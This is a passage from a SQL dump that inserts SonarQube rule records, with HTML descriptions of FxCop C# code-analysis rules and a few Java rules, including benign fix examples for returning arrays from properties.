<p>
            To fix a violation of this rule, secure the type or the method with an inheritance demand for the same permission as the link demand.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ReviewDeclarativeSecurityOnValueTypes}<br/>




                {rule:fxcop:SecuredTypesShouldNotExposeFields}<br/>




                {rule:fxcop:DoNotIndirectlyExposeMethodsWithLinkDemands}<br/>




                {rule:fxcop:OverrideLinkDemandsShouldBeIdenticalToBase}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182321.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182321.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812480, 1510817812480, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (550, 'CA1819: Properties should not return arrays', 'PropertiesShouldNotReturnArrays', 'CA1819', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected property in a public type returns an array.
</p>
<h2>Rule Description</h2>
<p>
            Arrays returned by properties are not write-protected, even if the property is read-only. To keep the array tamper-proof, the property must return a copy of the array. Typically, users will not understand the adverse performance implications of calling such a property. Specifically, they might use the property as an indexed property.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, either make the property a method or change the property to return a collection.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Attributes can contain properties that return arrays, but cannot contain properties that return collections. You can suppress a warning that is raised for a property of an attribute that is derived from the [System.Attribute] class. Otherwise, do not suppress a warning from this rule.
</p>
<h2>Example Violation</h2>

<h3>Description</h3>
<p>
                The following example shows a property that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace PerformanceLibrary
{
    public class Book
    {
        private string[] _Pages;

        public Book(string[] pages)
        {
            _Pages = pages;
        }

        public string[] Pages
        {
            get { return _Pages; }
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                To fix a violation of this rule, either make the property a method or change the property to return a collection instead of an array.
</p>
<h2>Change the Property to a Method Example</h2>

<h3>Description</h3>
<p>
                The following example fixes the violation by changing the property to a method.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace PerformanceLibrary
{
    public class Book
    {
        private string[] _Pages;

        public Book(string[] pages)
        {
            _Pages = pages;
        }

        public string[] GetPages()
        {
            // Need to return a clone of the array so that consumers             
            // of this library cannot change its contents             
            return (string[])_Pages.Clone();
        }
    }
}
</pre>





</p>
<h2>Return a Collection Example</h2>

<h3>Description</h3>
<p>
                The following example fixes the violation by changing the property to return a

                  ReadOnlyCollection.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Collections.ObjectModel;

namespace PerformanceLibrary
{
    public class Book
    {
        private ReadOnlyCollection&lt;string&gt; _Pages;
        public Book(string[] pages)
        {
            _Pages = new ReadOnlyCollection&lt;string&gt;(pages);
        }

        public ReadOnlyCollection&lt;string&gt; Pages
        {
            get { return _Pages; }
        }
    }
}
</pre>





</p>
<h2>Allowing Users to Modify a Property</h2>

<h3>Description</h3>
<p>
                You might want to allow the consumer of the class to modify a property. The following example shows a read/write property that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace PerformanceLibrary
{
    public class Book
    {
        private string[] _Pages;

        public Book(string[] pages)
        {
            _Pages = pages;
        }

        public string[] Pages
        {
            get { return _Pages; }
            set { _Pages = value; }
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                The following example fixes the violation by changing the property to return a Collection.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;
using System.Collections.ObjectModel;

namespace PerformanceLibrary
{
    public class Book
    {
        private Collection&lt;string&gt; _Pages;

        public Book(string[] pages)
        {
            _Pages = new Collection&lt;string&gt;(pages);
        }

        public Collection&lt;string&gt; Pages
        {
            get { return _Pages; }
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:UsePropertiesWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/0fss9skc.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/0fss9skc.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812481, 1510817812481, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (784, 'Methods should not be too complex', 'MethodCyclomaticComplexity', 'S1541', 'squid', '<p>The cyclomatic complexity of methods should not exceed a defined threshold.</p>
<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>While having a large number of fields in a class may indicate that it should be split, this rule nonetheless ignores high complexity in
<code>equals</code> and <code>hashCode</code> methods.</p>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '10min', 'per complexity point above the threshold', NULL, 'brain-overload', false, 'HTML', 1510817812796, 1510817812796, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (785, 'Track comments matching a regular expression', 'S124', NULL, 'squid', '<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>
<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing "REVIEW".</p>
<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in
<code>(?i).*REVIEW.*</code>.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817812798, 1510817812798, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (786, 'Annotation repetitions should not be wrapped', 'S1710', NULL, 'squid', '<p>Before Java 8 if you needed to use multiple instances of the same annotation, they had to be wrapped in a container annotation. With Java 8, that''s
no longer necessary, allowing for cleaner, more readable code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>8</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@SomeAnnotations({  // Noncompliant
  @SomeAnnotation(..a..),
  @SomeAnnotation(..b..),
  @SomeAnnotation(..c..),
})
public class SomeClass {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@SomeAnnotation(..a..)
@SomeAnnotation(..b..)
@SomeAnnotation(..c..)
public class SomeClass {
  ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'java8', false, 'HTML', 1510817812799, 1510817812800, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (551, 'CA2236: Call base class methods on ISerializable types', 'CallBaseClassMethodsOnISerializableTypes', 'CA2236', 'fxcop', '<h2>Cause</h2>
<p>
            A type derives from a type that implements the <code>System.Runtime.Serialization.ISerializable</code> interface, and one of the following conditions is true:
            <ul>
              <li>
                The type implements the serialization constructor, that is, a constructor with the <code>System.Runtime.Serialization.SerializationInfo</code>, <code>System.Runtime.Serialization.StreamingContext</code> parameter signature, but does not call the serialization constructor of the base type.
              </li>
              <li>
                The type implements the <code>ISerializable.GetObjectData</code> method but does not call the <code>GetObjectData</code> method of the base type.
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            In a custom serialization process, a type implements the <code>GetObjectData</code> method to serialize its fields and the serialization constructor to de-serialize the fields. If the type derives from a type that implements the <code>ISerializable</code> interface, the base type <code>GetObjectData</code> method and serialization constructor should be called to serialize/de-serialize the fields of the base type. Otherwise, the type will not be serialized and de-serialized correctly. Note that if the derived type does not add any new fields, the type does not need to implement the <code>GetObjectData</code> method nor the serialization constructor or call the base type equivalents.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call the base type <code>GetObjectData</code> method or serialization constructor from the corresponding derived type method or constructor.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ImplementISerializableCorrectly}<br/>




                {rule:fxcop:ImplementSerializationConstructors}<br/>




                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>




                {rule:fxcop:MarkAllNonSerializableFields}<br/>




                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>




                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>




                {rule:fxcop:SecureSerializationConstructors}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182326.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182326.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812484, 1510817812485, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (552, 'CA1031: Do not catch general exception types', 'DoNotCatchGeneralExceptionTypes', 'CA1031', 'fxcop', '<h2>Cause</h2>
<p>
            A general exception such as <code>System.Exception</code> or <code>System.SystemException</code> is caught in a <code>catch</code> statement, or a general catch clause such as catch() is used.
</p>
<h2>Rule Description</h2>
<p>
            General exceptions should not be caught.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, catch a more specific exception, or rethrow the general exception as the last statement in the <code>catch</code> block.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Catching general exception types can hide run-time problems from the library user and can make debugging more difficult.





                    Note




                    Starting with the .NET Framework 4, the common language runtime (CLR) no longer delivers corrupted state exceptions that occur in the operating system and managed code, such as access violations in Windows, to be handled by managed code. If you want to compile an application in the .NET Framework 4 or later versions and maintain handling of corrupted state exceptions, you can apply the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute to the method that handles the corrupted state exception.




</p>
<h2>Example</h2>
<p>


                {rule:fxcop:RethrowToPreserveStackDetails}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182137.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182137.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812486, 1510817812487, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (553, 'CA1062: Validate arguments of public methods', 'ValidateArgumentsOfPublicMethods', 'CA1062', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible method dereferences one of its reference arguments without verifying whether that argument is <code>null</code> (<code>Nothing</code> in Visual Basic).
</p>
<h2>Rule Description</h2>
<p>
            All reference arguments that are passed to externally visible methods should be checked against <code>null</code>. If appropriate, throw a <code>ArgumentNullException</code> when the argument is <code>null</code>.
            If a method can be called from an unknown assembly because it is declared public or protected, you should validate all parameters of the method. If the method is designed to be called only by known assemblies, you should make the method internal and apply the <code>InternalsVisibleToAttribute</code>  attribute to the assembly that contains the method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, validate each reference argument against <code>null</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
             You can suppress a warning from this rule if you are sure that the dereferenced parameter has been validated by another method call in the function.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182182.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182182.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812488, 1510817812488, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (554, 'CA1601: Do not use timers that prevent power state changes', 'DoNotUseTimersThatPreventPowerStateChanges', 'CA1601', 'fxcop', '<h2>Cause</h2>
<p>
            A timer has an interval set to occur more than one time per second.
</p>
<h2>Rule Description</h2>
<p>
            Do not poll more often than one time per second or use timers that occur more frequently than one time per second. Higher-frequency periodic activity will keep the CPU busy and interfere with power-saving idle timers that turn off the display and hard disks.
</p>
<h2>How to Fix Violations</h2>
<p>
            Set timer intervals to occur less than one time per second.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            This rule should be suppressed only if firing the timer more than one time per second is required and mobility considerations can safely be ignored.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182230.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182230.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812489, 1510817812489, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (555, 'CA2223: Members should differ by more than return type', 'MembersShouldDifferByMoreThanReturnType', 'CA2223', 'fxcop', '<h2>Cause</h2>
<p>
            Two public or protected members have signatures that are identical except for return type.
</p>
<h2>Rule Description</h2>
<p>
            Although the common language runtime permits the use of return types to differentiate between otherwise identical members, this feature is not in the Common Language Specification, nor is it a common feature of .NET programming languages. When members differ only by return type, developers and development tools might not correctly distinguish between them.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the design of the members so that they are unique based only on their names and parameter types, or do not expose the members.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182352.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182352.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812490, 1510817812490, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (556, 'Template for custom FxCop rules', 'CustomRuleTemplate', NULL, 'fxcop', '<p>
Follow these steps to make your custom FxCop rules available in SonarQube:
</p>

<ol>
  <li>Place your custom FxCop rules assemblies in the "Rules" subdirectory of your FxCop installation directory.</li>
  <li>For each custom rule:</li>
  <ol>
    <li>Create a new rule in SonarQube by "copying" this rule template and specify the <code>CheckId</code> of your custom rule, a title, a description, and a default severity.</li>
    <li>Enable the newly created rule in your quality profile</li>
  </ol>
  <li>Relaunch an analysis on your projects, et voilà, your custom rules are executed!</li>
</ol>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817812491, 1510817812491, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (673, 'CA1050: Declare types in namespaces', 'DeclareTypesInNamespaces', 'CA1050', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type is defined outside the scope of a named namespace.
</p>
<h2>Rule Description</h2>
<p>
            Types are declared in namespaces to prevent name collisions, and as a way to organize related types in an object hierarchy. Types that are outside any named namespace are in a global namespace that cannot be referenced in code.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, place the type in a namespace.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Although you never have to suppress a warning from this rule, it is safe to do this when the assembly will never be used together with other assemblies.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182134.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182134.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812643, 1510817812643, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (557, 'CA2242: Test for NaN correctly', 'TestForNaNCorrectly', 'CA2242', 'fxcop', '<h2>Cause</h2>
<p>
            An expression tests a value against <code>Single.Nan</code> or <code>Double.Nan</code>.
</p>
<h2>Rule Description</h2>
<p>


                <code>Double.NaN</code>
              , which represents not-a-number, results when an arithmetic operation is undefined. Any expression that tests equality between a value and <code>Double.NaN</code> always returns <code>false</code>. Any expression that tests inequality between a value and <code>Double.NaN</code> always returns <code>true</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule and accurately determine whether a value represents <code>Double.NaN</code>, use <code>Single.IsNan</code> or <code>Double.IsNan</code> to test the value.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264491.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264491.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812496, 1510817812496, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (558, 'CA1040: Avoid empty interfaces', 'AvoidEmptyInterfaces', 'CA1040', 'fxcop', '<h2>Cause</h2>
<p>
            The interface does not declare any members or implement two or more other interfaces.
</p>
<h2>Rule Description</h2>
<p>
            Interfaces define members that provide a behavior or usage contract. The functionality that is described by the interface can be adopted by any type, regardless of where the type appears in the inheritance hierarchy. A type implements an interface by providing implementations for the members of the interface. An empty interface does not define any members. Therefore, it does not define a contract that can be implemented.
            If your design includes empty interfaces that types are expected to implement, you are probably using an interface as a marker or a way to identify a group of types. If this identification will occur at run time, the correct way to accomplish this is to use a custom attribute. Use the presence or absence of the attribute, or the properties of the attribute, to identify the target types. If the identification must occur at compile time, then it is acceptable to use an empty interface.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove the interface or add members to it. If the empty interface is being used to label a set of types, replace the interface with a custom attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the interface is used to identify a set of types at compile time.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182128.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182128.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812497, 1510817812497, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (559, 'CA1045: Do not pass types by reference', 'DoNotPassTypesByReference', 'CA1045', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method in a public type has a <code>ref</code> parameter that takes a primitive type, a reference type, or a value type that is not one of the built-in types.
</p>
<h2>Rule Description</h2>
<p>
            Passing types by reference (using <code>out</code> or <code>ref</code>) requires experience with pointers, understanding how value types and reference types differ, and handling methods that have multiple return values. Also, the difference between <code>out</code> and <code>ref</code> parameters is not widely understood.
            When a reference type is passed "by reference," the method intends to use the parameter to return a different instance of the object. (Passing a reference type by reference is also known as using a double pointer, pointer to a pointer, or double indirection.) Using the default calling convention, which is pass "by value," a parameter that takes a reference type already receives a pointer to the object. The pointer, not the object to which it points, is passed by value. Passing by value means that the method cannot change the pointer to have it point to a new instance of the reference type, but can change the contents of the object to which it points. For most applications this is sufficient and yields the behavior that you want.
            If a method must return a different instance, use the return value of the method to accomplish this. See the <code>System.String</code> class for a variety of methods that operate on strings and return a new instance of a string. By using this model, it is left to the caller to decide whether the original object is preserved.
            Although return values are commonplace and heavily used, the correct application of <code>out</code> and <code>ref</code> parameters requires intermediate design and coding skills. Library architects who design for a general audience should not expect users to master working with <code>out</code> or <code>ref</code> parameters.





                    Note




                    When you work with parameters that are large structures, the additional resources that are required to copy these structures could cause a performance effect when you pass by value. In these cases, you might consider using <code>ref</code> or <code>out</code> parameters.




</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule that is caused by a value type, have the method return the object as its return value. If the method must return multiple values, redesign it to return a single instance of an object that holds the values.
            To fix a violation of this rule that is caused by a reference type, make sure that the behavior that you want is to return a new instance of the reference. If it is, the method should use its return value to do this.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule; however, this design could cause usability issues.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidOutParameters}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182146.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182146.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812498, 1510817812499, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (560, 'CA1702: Compound words should be cased correctly', 'CompoundWordsShouldBeCasedCorrectly', 'CA1702', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an identifier contains multiple words and at least one of the words appears to be a compound word that is not cased correctly.
</p>
<h2>Rule Description</h2>
<p>
            The name of the identifier is split into words that are based on the casing. Each contiguous two-word combination is checked by the Microsoft spelling checker library. If it is recognized, the identifier produces a violation of the rule. Examples of compound words that cause a violation are "CheckSum" and "MultiPart", which should be cased as "Checksum" and "Multipart", respectively. Due to previous common usage, several exceptions are built into the rule, and several single words are flagged, such as "Toolbar" and "Filename", that should be cased as two distinct words (in this case, "ToolBar" and "FileName").
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Change the name so that it is cased correctly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if both parts of the compound word are recognized by the spelling dictionary and the intent is to use two words.
</p>
<h2>Related Rules</h2>
<p>


                CA1701: Resource string compound words should be cased correctly




                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>




                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264474.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264474.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812500, 1510817812500, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (561, 'CA1810: Initialize reference type static fields inline', 'InitializeReferenceTypeStaticFieldsInline', 'CA1810', 'fxcop', '<h2>Cause</h2>
<p>
            A reference type declares an explicit static constructor.
</p>
<h2>Rule Description</h2>
<p>
            When a type declares an explicit static constructor, the just-in-time (JIT) compiler adds a check to each static method and instance constructor of the type to make sure that the static constructor was previously called. Static initialization is triggered when any static member is accessed or when an instance of the type is created. However, static initialization is not triggered if you declare a variable of the type but do not use it, which can be important if the initialization changes global state.
            When all static data is initialized inline and an explicit static constructor is not declared, Microsoft intermediate language (MSIL) compilers add the <code>beforefieldinit</code> flag and an implicit static constructor, which initializes the static data, to the MSIL type definition. When the JIT compiler encounters the <code>beforefieldinit</code> flag, most of the time the static constructor checks are not added. Static initialization is guaranteed to occur at some time before any static fields are accessed but not before a static method or instance constructor is invoked. Note that static initialization can occur at any time after a variable of the type is declared.
            Static constructor checks can decrease performance. Often a static constructor is used only to initialize static fields, in which case you must only make sure that static initialization occurs before the first access of a static field. The <code>beforefieldinit</code> behavior is appropriate for these and most other types. It is only inappropriate when static initialization affects global state and one of the following is true:
            <ul>
              <li>
                The effect on global state is expensive and is not required if the type is not used.
              </li>
              <li>
                The global state effects can be accessed without accessing any static fields of the type.
              </li>
            </ul>
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, initialize all static data when it is declared and remove the static constructor.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if performance is not a concern; or if global state changes that are caused by static initialization are expensive or must be guaranteed to occur before a static method of the type is called or an instance of the type is created.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:InitializeValueTypeStaticFieldsInline}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182275.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182275.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812501, 1510817812501, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (562, 'CA2136: Members should not have conflicting transparency annotations', 'TransparencyAnnotationsShouldNotConflict', 'CA2136', 'fxcop', '<h2>Cause</h2>
<p>
            This rule fires when a type member is marked with a <code>System.Security</code> security attribute that has a different transparency than the security attribute of a container of the member.
</p>
<h2>Rule Description</h2>
<p>
            Transparency attributes are applied from code elements of larger scope to elements of smaller scope. The transparency attributes of code elements with larger scope take precedence over transparency attributes of code elements that are contained in the first element. For example, a class that is marked with the <code>SecurityCriticalAttribute</code> attribute cannot contain a method that is marked with the <code>SecuritySafeCriticalAttribute</code> attribute.
</p>
